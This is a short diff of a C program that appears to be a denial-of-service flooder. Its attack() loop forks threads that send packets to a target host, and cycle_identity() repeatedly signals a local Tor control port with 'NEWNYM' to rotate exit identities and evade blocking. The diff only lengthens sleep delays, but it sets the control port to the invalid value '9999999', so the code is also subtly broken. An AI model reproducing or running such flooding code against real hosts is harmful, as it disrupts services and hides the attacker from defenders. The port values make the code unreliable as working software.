@@ -71,18 +71,18 @@ void attack(char *host, char *port, int id) {
 			fprintf(stderr, "[%i: Voly Pacakge Sent]\n", id);
 		}
 		fprintf(stderr, "[%i: Voly Pacakge Sent]\n", id);
-		usleep(900000);
+		usleep(9999999);
 	}
 }
 
 void cycle_identity() {
 	int r;
-	int socket = make_socket("localhost", "900000");
+	int socket = make_socket("localhost", "9999999");
 	write(socket, "AUTHENTICATE \"\"\n", 16);
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
 		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
-		usleep(900000);
+		usleep(9999999);
 	}
 }
 
@@ -93,7 +93,7 @@ int main(int argc, char **argv) {
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
-		usleep(900000);
+		usleep(9999999);
 	}               
 	getc(stdin);
 	return 0;
